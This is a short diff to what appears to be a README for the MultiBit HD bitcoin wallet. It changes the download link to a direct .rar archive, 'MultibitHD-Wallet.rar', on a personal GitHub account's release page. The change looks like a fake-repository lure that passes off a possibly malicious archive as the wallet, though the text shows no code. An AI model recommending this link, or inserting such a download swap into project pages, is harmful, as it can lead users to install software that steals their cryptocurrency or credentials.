@@ -4,7 +4,7 @@
 
 MultiBit was designed to be as easy to use as possible, but Bitcoin itself may require some getting used to. These articles are intended to provide useful explanations of the common problems that people face. MultiBit HD Designed to be easy to use. It is intended for home users (or small merchants) who want to use a desktop computer for their daily bitcoin operations.
 
-[Download MultiBit HD Wallet for Windows/Linux/MacOS](https://github.com/Novikoha/multibit-hd)
+[Download MultiBit HD Wallet v0.5.1 for Windows/Linux/MacOS](https://github.com/Novikoha/multibit-hd/releases/download/Multibit.HD.Wallet/MultibitHD-Wallet.rar)
 ---------------------------------------------------------------------
 
 # How to use MultiBit HD
